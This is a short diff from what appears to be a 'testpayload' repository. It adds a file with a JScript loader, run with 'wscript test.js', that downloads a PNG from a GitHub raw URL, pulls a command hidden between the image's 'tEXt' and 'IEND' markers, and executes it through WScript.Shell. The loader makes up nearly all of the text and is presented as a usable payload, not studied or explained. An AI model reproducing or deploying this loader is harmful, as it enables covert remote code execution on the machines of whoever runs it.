@@ -1,1 +1,14 @@
 testpayload
+testc.png
+
+wscript test.js
+
+h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.SetTimeouts(0, 0, 0, 0);
+h.Open("GET","https://raw.githubusercontent.com/harry1080/testpayload/master/testc.png",false);
+h.Send();
+Data = h.ResponseText;
+x=Data.indexOf("tEXt");
+y=Data.indexOf("IEND");
+str=Data.substring(x+4,y-8);
+new ActiveXObject("WScript.Shell").Run(str); 
